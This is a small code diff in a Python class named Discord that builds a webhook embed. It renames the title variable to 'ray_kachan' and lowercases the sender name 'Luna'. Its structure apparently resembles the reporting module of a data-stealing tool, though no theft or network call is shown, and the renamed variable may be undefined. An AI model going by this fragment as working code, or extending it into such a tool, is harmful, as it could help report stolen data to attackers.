@@ -462,7 +462,7 @@ class Discord:
             data = {
                 "embeds": [
                     {
-                        "title": f"{username}",
+                        "title": f"{ray_kachan}",
                         "color": 5639644,
                         "fields": [
                             {
@@ -478,7 +478,7 @@ class Discord:
                         },
                     }
                 ],
-                "username": "Luna",
+                "username": "luna",
                 "avatar_url": "https://cdn.discordapp.com/icons/958782767255158876/a_0949440b832bda90a3b95dc43feb9fb7.gif?size=4096",
             }
 
